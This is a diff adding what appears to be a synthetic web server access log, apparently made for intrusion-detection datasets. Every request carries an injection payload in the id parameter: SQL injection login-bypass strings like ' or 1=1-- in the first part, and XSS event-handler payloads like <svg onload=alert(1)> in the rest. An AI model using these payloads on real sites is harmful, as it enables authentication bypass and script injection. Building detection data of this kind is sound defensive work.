@@ -1,0 +1,250 @@
+ip: 45.241.202.241., user-identifier: UD18, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id==&password=placeholder HTTP/1.0, status: 200
+ip: 125.49.71.48., user-identifier: UD66, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' or 1=1--&password=placeholder HTTP/1.0, status: 200
+ip: 151.80.164.55., user-identifier: UD111, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' OR 'x'='x'#;&password=placeholder HTTP/1.0, status: 200
+ip: 128.66.239.238., user-identifier: UD91, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' or         0=0 #&password=placeholder HTTP/1.0, status: 200
+ip: 11.3.102.212., user-identifier: UD154, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id= or 1=1&password=placeholder HTTP/1.0, status: 200
+ip: 27.36.196.39., user-identifier: UD46, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=" or "1"="1"--&password=placeholder HTTP/1.0, status: 200
+ip: 23.146.9.192., user-identifier: UD128, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=" or 1=1 –&password=placeholder HTTP/1.0, status: 200
+ip: 184.213.120.149., user-identifier: UD209, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=or 1=1/*&password=placeholder HTTP/1.0, status: 200
+ip: 39.133.173.34., user-identifier: UD191, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=admin' --&password=placeholder HTTP/1.0, status: 200
+ip: 229.140.125.164., user-identifier: UD135, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=" or "1"="1"/*&password=placeholder HTTP/1.0, status: 200
+ip: 182.141.179.139., user-identifier: UD228, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=")) or (("x"))=(("x&password=placeholder HTTP/1.0, status: 200
+ip: 171.9.224.254., user-identifier: UD19, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=admin" or "1"="1"#&password=placeholder HTTP/1.0, status: 200
+ip: 47.133.9.172., user-identifier: UD196, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id= or 1=1–&password=placeholder HTTP/1.0, status: 200
+ip: 222.145.217.84., user-identifier: UD231, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=admin" or 1=1/*&password=placeholder HTTP/1.0, status: 200
+ip: 144.144.147.204., user-identifier: UD161, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=")) or (("x"))=(("x&password=placeholder HTTP/1.0, status: 200
+ip: 45.19.133.122., user-identifier: UD177, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=') or ('1'='1'#&password=placeholder HTTP/1.0, status: 200
+ip: 95.180.210.255., user-identifier: UD31, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' or a=a--&password=placeholder HTTP/1.0, status: 200
+ip: 168.50.234.252., user-identifier: UD151, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=admin' or 1=1/*&password=placeholder HTTP/1.0, status: 200
+ip: 226.150.5.31., user-identifier: UD189, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=or 1=1/*&password=placeholder HTTP/1.0, status: 200
+ip: 119.176.166.30., user-identifier: UD59, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' group by password having 1=1--&password=placeholder HTTP/1.0, status: 200
+ip: 199.90.17.214., user-identifier: UD217, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' --&password=placeholder HTTP/1.0, status: 200
+ip: 135.229.65.61., user-identifier: UD51, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=" --&password=placeholder HTTP/1.0, status: 200
+ip: 199.160.41.49., user-identifier: UD168, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=admin'/*&password=placeholder HTTP/1.0, status: 200
+ip: 50.30.78.191., user-identifier: UD10, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=") or ("x")=("x&password=placeholder HTTP/1.0, status: 200
+ip: 168.113.141.53., user-identifier: UD118, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id= and 1=1&password=placeholder HTTP/1.0, status: 200
+ip: 56.227.91.107., user-identifier: UD209, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="*"&password=placeholder HTTP/1.0, status: 200
+ip: 163.220.147.195., user-identifier: UD149, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id= or 1=1&password=placeholder HTTP/1.0, status: 200
+ip: 119.44.86.143., user-identifier: UD63, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="/*&password=placeholder HTTP/1.0, status: 200
+ip: 158.217.27.80., user-identifier: UD102, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=") or "1"="1"#&password=placeholder HTTP/1.0, status: 200
+ip: 196.135.115.53., user-identifier: UD114, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=admin" or "1"="1"/*&password=placeholder HTTP/1.0, status: 200
+ip: 22.30.133.151., user-identifier: UD135, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=') or '1'='1'--&password=placeholder HTTP/1.0, status: 200
+ip: 175.52.162.175., user-identifier: UD253, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' or '1'='1'/*&password=placeholder HTTP/1.0, status: 200
+ip: 246.195.179.70., user-identifier: UD203, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' or username like '%&password=placeholder HTTP/1.0, status: 200
+ip: 254.19.18.186., user-identifier: UD56, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' or a=a–&password=placeholder HTTP/1.0, status: 200
+ip: 175.18.239.188., user-identifier: UD221, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=') or '1'='1'/*&password=placeholder HTTP/1.0, status: 200
+ip: 35.70.150.236., user-identifier: UD192, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=or 1=1&password=placeholder HTTP/1.0, status: 200
+ip: 71.86.153.59., user-identifier: UD104, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=') or '1'='1--&password=placeholder HTTP/1.0, status: 200
+ip: 224.203.107.219., user-identifier: UD93, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' or uname like '%&password=placeholder HTTP/1.0, status: 200
+ip: 6.177.186.225., user-identifier: UD8, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=admin" or "1"="1"#&password=placeholder HTTP/1.0, status: 200
+ip: 20.53.212.255., user-identifier: UD40, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=')) or (('x'))=(('x&password=placeholder HTTP/1.0, status: 200
+ip: 13.236.47.53., user-identifier: UD185, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' --&password=placeholder HTTP/1.0, status: 200
+ip: 191.156.136.202., user-identifier: UD227, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' or 1=1--&password=placeholder HTTP/1.0, status: 200
+ip: 7.97.250.82., user-identifier: UD206, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' '&password=placeholder HTTP/1.0, status: 200
+ip: 133.71.232.108., user-identifier: UD174, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=admin') or '1'='1'/*&password=placeholder HTTP/1.0, status: 200
+ip: 185.104.52.174., user-identifier: UD170, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=" or 0=0 #&password=placeholder HTTP/1.0, status: 200
+ip: 152.214.198.56., user-identifier: UD150, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' or a=a--&password=placeholder HTTP/1.0, status: 200
+ip: 30.92.16.139., user-identifier: UD29, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=admin" or 1=1&password=placeholder HTTP/1.0, status: 200
+ip: 187.124.19.162., user-identifier: UD146, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' group by userid having 1=1--&password=placeholder HTTP/1.0, status: 200
+ip: 161.144.149.2., user-identifier: UD42, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=' or username like '%&password=placeholder HTTP/1.0, status: 200
+ip: 22.151.1.154., user-identifier: UD242, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=") or "1"="1"#&password=placeholder HTTP/1.0, status: 200
+ip: 190.200.29.5., user-identifier: UD239, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<form onsubmit=alert(1)><input type=submit>&password=placeholder HTTP/1.0, status: 200
+ip: 176.0.235.192., user-identifier: UD114, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<audio src onloadstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 133.194.36.160., user-identifier: UD203, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee loop=1 width=0 onfinish=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 17.148.191.68., user-identifier: UD235, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhashchange=alert(1)><a href=#x>click this!#x&password=placeholder HTTP/1.0, status: 200
+ip: 84.229.96.220., user-identifier: UD92, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 27.74.114.77., user-identifier: UD43, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<input autofocus onblur=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 237.253.194.155., user-identifier: UD171, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onscroll=alert(1)><br><br><br><br>&password=placeholder HTTP/1.0, status: 200
+ip: 240.81.29.54., user-identifier: UD130, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<form onsubmit=alert(1)><input type=submit>&password=placeholder HTTP/1.0, status: 200
+ip: 178.172.73.230., user-identifier: UD19, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 47.135.141.192., user-identifier: UD164, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<keygen autofocus onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 145.237.249.199., user-identifier: UD94, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<svg onload=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 93.130.36.232., user-identifier: UD228, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<form onsubmit=alert(1)><input type=submit>&password=placeholder HTTP/1.0, status: 200
+ip: 43.49.13.74., user-identifier: UD143, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)-'&password=placeholder HTTP/1.0, status: 200
+ip: 92.11.251.117., user-identifier: UD148, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onresize=alert(1)>press F12!&password=placeholder HTTP/1.0, status: 200
+ip: 149.30.128.109., user-identifier: UD55, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)-'&password=placeholder HTTP/1.0, status: 200
+ip: 127.178.240.206., user-identifier: UD172, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee loop=1 width=0 onfinish=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 67.24.201.138., user-identifier: UD49, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="autofocus/onfocus=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 251.217.8.156., user-identifier: UD196, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onresize=alert(1)>press F12!&password=placeholder HTTP/1.0, status: 200
+ip: 96.6.59.122., user-identifier: UD70, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 56.135.114.187., user-identifier: UD124, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 39.174.114.13., user-identifier: UD138, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 103.221.178.98., user-identifier: UD210, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee onstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 85.71.87.100., user-identifier: UD58, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<select onchange=alert(1)><option>1<option>2&password=placeholder HTTP/1.0, status: 200
+ip: 127.149.243.97., user-identifier: UD5, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<video onloadstart=alert(1)><source>&password=placeholder HTTP/1.0, status: 200
+ip: 17.225.120.27., user-identifier: UD226, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee onstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 75.141.89.85., user-identifier: UD206, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee loop=1 width=0 onfinish=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 245.251.70.64., user-identifier: UD223, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhelp=alert(1)>press F1! (MSIE)&password=placeholder HTTP/1.0, status: 200
+ip: 32.103.118.118., user-identifier: UD190, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="><svg onload=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 249.12.113.155., user-identifier: UD73, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="><svg onload=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 139.210.41.234., user-identifier: UD190, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 157.34.54.108., user-identifier: UD183, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<audio src onloadstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 35.248.110.50., user-identifier: UD237, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="autofocus/onfocus=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 128.241.147.44., user-identifier: UD48, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee onstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 226.33.237.97., user-identifier: UD188, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="><svg onload=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 47.108.7.58., user-identifier: UD69, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<form onsubmit=alert(1)><input type=submit>&password=placeholder HTTP/1.0, status: 200
+ip: 99.41.100.23., user-identifier: UD65, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<select onchange=alert(1)><option>1<option>2&password=placeholder HTTP/1.0, status: 200
+ip: 71.220.42.53., user-identifier: UD30, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<form onsubmit=alert(1)><input type=submit>&password=placeholder HTTP/1.0, status: 200
+ip: 211.127.243.19., user-identifier: UD229, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 47.71.25.109., user-identifier: UD6, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<form onsubmit=alert(1)><input type=submit>&password=placeholder HTTP/1.0, status: 200
+ip: 100.105.213.228., user-identifier: UD199, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)-'&password=placeholder HTTP/1.0, status: 200
+ip: 85.220.124.197., user-identifier: UD223, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 93.151.240.85., user-identifier: UD27, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<svg onload=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 130.91.188.233., user-identifier: UD33, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onresize=alert(1)>press F12!&password=placeholder HTTP/1.0, status: 200
+ip: 143.159.237.91., user-identifier: UD144, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="onmouseover=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 113.99.90.74., user-identifier: UD233, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<input autofocus onblur=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 203.95.64.157., user-identifier: UD207, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onscroll=alert(1)><br><br><br><br>&password=placeholder HTTP/1.0, status: 200
+ip: 75.74.231.93., user-identifier: UD121, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<select onchange=alert(1)><option>1<option>2&password=placeholder HTTP/1.0, status: 200
+ip: 200.234.229.49., user-identifier: UD195, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 187.210.191.82., user-identifier: UD39, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="autofocus/onfocus=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 185.210.119.48., user-identifier: UD87, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 108.194.100.135., user-identifier: UD212, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<input autofocus onblur=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 166.158.21.229., user-identifier: UD163, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x&password=placeholder HTTP/1.0, status: 200
+ip: 204.192.73.56., user-identifier: UD228, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 70.39.36.98., user-identifier: UD108, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhelp=alert(1)>press F1! (MSIE)&password=placeholder HTTP/1.0, status: 200
+ip: 172.185.114.37., user-identifier: UD243, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 175.80.24.171., user-identifier: UD239, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 235.56.205.10., user-identifier: UD210, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="onmouseover=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 25.159.191.18., user-identifier: UD118, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onscroll=alert(1)><br><br><br><br>&password=placeholder HTTP/1.0, status: 200
+ip: 112.198.95.12., user-identifier: UD49, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<video onloadstart=alert(1)><source>&password=placeholder HTTP/1.0, status: 200
+ip: 102.104.210.243., user-identifier: UD126, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhashchange=alert(1)><a href=#x>click this!#x&password=placeholder HTTP/1.0, status: 200
+ip: 223.243.100.15., user-identifier: UD55, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onresize=alert(1)>press F12!&password=placeholder HTTP/1.0, status: 200
+ip: 100.252.47.154., user-identifier: UD16, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 96.163.99.249., user-identifier: UD15, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<input autofocus onblur=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 216.188.147.40., user-identifier: UD46, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onscroll=alert(1)><br><br><br><br>&password=placeholder HTTP/1.0, status: 200
+ip: 82.229.38.118., user-identifier: UD201, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<select onchange=alert(1)><option>1<option>2&password=placeholder HTTP/1.0, status: 200
+ip: 129.218.172.75., user-identifier: UD171, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<video onloadstart=alert(1)><source>&password=placeholder HTTP/1.0, status: 200
+ip: 107.204.55.29., user-identifier: UD226, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 240.165.217.71., user-identifier: UD31, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 89.124.51.32., user-identifier: UD112, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 182.96.203.121., user-identifier: UD71, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee onstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 175.242.12.127., user-identifier: UD67, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onhashchange=alert(1)><a href=#x>click this!#x&password=placeholder HTTP/1.0, status: 200
+ip: 86.57.3.237., user-identifier: UD65, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x&password=placeholder HTTP/1.0, status: 200
+ip: 228.130.243.69., user-identifier: UD133, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="onmouseover=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 159.12.233.211., user-identifier: UD190, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 61.35.203.233., user-identifier: UD122, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onscroll=alert(1)><br><br><br><br>&password=placeholder HTTP/1.0, status: 200
+ip: 113.174.228.246., user-identifier: UD2, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<form onsubmit=alert(1)><input type=submit>&password=placeholder HTTP/1.0, status: 200
+ip: 105.47.66.120., user-identifier: UD92, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 230.147.14.45., user-identifier: UD17, name: frank, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="><svg onload=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 62.34.195.9., user-identifier: UD205, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<audio src onloadstart=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 166.108.242.83., user-identifier: UD171, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onscroll=alert(1)><br><br><br><br>&password=placeholder HTTP/1.0, status: 200
+ip: 210.38.237.44., user-identifier: UD141, name: satang, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 220.151.20.195., user-identifier: UD108, name: guy, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<menu id=x contextmenu=x onshow=alert(1)>right click me!&password=placeholder HTTP/1.0, status: 200
+ip: 210.107.203.102., user-identifier: UD216, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onscroll=alert(1)><br><br><br><br>&password=placeholder HTTP/1.0, status: 200
+ip: 126.2.222.125., user-identifier: UD114, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 228.119.180.92., user-identifier: UD40, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<keygen autofocus onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 82.186.176.169., user-identifier: UD26, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee loop=1 width=0 onfinish=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 225.245.239.30., user-identifier: UD68, name: charn, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<svg onload=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 246.166.36.94., user-identifier: UD216, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<keygen autofocus onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 17.79.14.219., user-identifier: UD180, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onscroll=alert(1)><br><br><br><br>&password=placeholder HTTP/1.0, status: 200
+ip: 163.111.221.152., user-identifier: UD184, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 43.83.96.182., user-identifier: UD133, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="autofocus/onfocus=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 116.220.181.5., user-identifier: UD152, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee loop=1 width=0 onfinish=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 66.232.46.188., user-identifier: UD11, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<marquee loop=1 width=0 onfinish=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 52.223.139.40., user-identifier: UD115, name: junior, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<body onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 252.42.50.205., user-identifier: UD209, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id='-alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 230.213.149.242., user-identifier: UD110, name: knot, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id="><svg onload=alert(1)//&password=placeholder HTTP/1.0, status: 200
+ip: 45.106.206.5., user-identifier: UD135, name: gal, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<svg onload=alert(1)>&password=placeholder HTTP/1.0, status: 200
+ip: 240.133.182.233., user-identifier: UD229, name: leon, time-stamp: [10 / Oct / 2000:13: 55:36 - 0700], header: GET /?id=<keygen autofocus onfocus=alert(1)>&password=placeholder HTTP/1.0, status: 200
